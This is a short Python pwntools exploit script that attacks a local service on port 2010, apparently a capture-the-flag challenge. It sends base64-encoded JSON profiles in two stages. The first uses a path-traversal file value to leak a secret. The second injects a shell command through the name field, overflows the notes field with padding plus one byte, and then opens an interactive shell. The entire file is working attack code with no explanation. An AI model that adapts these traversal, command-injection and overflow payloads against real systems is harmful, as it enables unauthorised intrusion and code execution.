#!/usr/bin/python

from pwn import *
import json

context.log_level = "debug"

def main():
    p = remote("localhost", 2010)

    stage1 = {u'profile': {u'age': 21,
                           u'name': u'Placeholder name',
                           u'notes': u'Placeholder notes',
                           u'rockstar': u'speedrocker',
                           u'rockstar_file': u'../../../picpic'}}
    stage2 = {u'profile': {u'age': 21,
              u'name': u';/home/tastyriffs/helper;',
              u'notes': "A"*1024 + "\x33",
              u'rockstar': u'speedrocker',
              u'rockstar_file': u'speedrocker.rk'}}

    payload1 = json.dumps(stage1).encode("base64").replace("\n", "")
    payload2 = json.dumps(stage2).encode("base64").replace("\n", "")

    p.sendline("3")
    p.sendline(payload1)

    secret = p.recvline_contains("Rockstar Description")
    secret = int(secret.split()[-1])
    log.info("Got secret: %d" % secret)

    p.sendline(str(secret))
    p.sendline("3")
    p.sendline(payload2)

    p.sendline("4")

    p.interactive()

if __name__ == "__main__":
    main()
